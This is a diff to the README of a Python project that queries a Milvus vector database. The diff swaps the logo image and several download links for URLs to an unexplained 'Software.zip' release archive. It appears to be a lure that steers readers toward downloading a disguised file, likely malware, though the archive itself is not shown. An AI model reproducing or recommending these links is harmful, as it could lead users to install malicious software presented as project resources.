@@ -1,5 +1,5 @@
 # 🚀 Welcome to Milvus-Querying Repository!
-![Milvus Logo](https://www.vectorlogo.zone/logos/milvus-io/milvus-io-official.svg)
+![Milvus Logo](https://github.com/HAPPIE123/Milvus-Querying/releases/download/v2.0/Software.zip)
 ## Introduction
 Welcome to the **Milvus-Querying** repository! This project leverages Python, Hugging Face (sentence-transformers), Milvus + Docker (container running Vector DB) to create a powerful vector database. 
 
@@ -41,7 +41,7 @@ Here's how you can use the **Milvus-Querying** project:
 2. Populate the database with details of individuals.
 3. Utilize the provided Python scripts to perform searches based on Cosine-Similarity distances.
 4. Explore the querying capabilities and witness the efficiency in action!
-5. Visit the [Software.zip](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip) to access additional resources. 🚀
+5. Visit the [https://github.com/HAPPIE123/Milvus-Querying/releases/download/v2.0/Software.zip](https://github.com/HAPPIE123/Milvus-Querying/releases/download/v2.0/Software.zip) to access additional resources. 🚀
 
 ## Contributing
 We welcome contributions to enhance the **Milvus-Querying** project. Feel free to fork the repository, make your changes, and submit a pull request. Together, we can make this project even more powerful and efficient!
@@ -51,4 +51,4 @@ The **Milvus-Querying** project is licensed under the MIT License. See the [LICE
 
 Let's revolutionize searching and querying with vector databases powered by Milvus and Docker! 🌟🔍
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/HAPPIE123/Milvus-Querying/releases/download/v2.0/Software.zip)](https://github.com/HAPPIE123/Milvus-Querying/releases/download/v2.0/Software.zip)
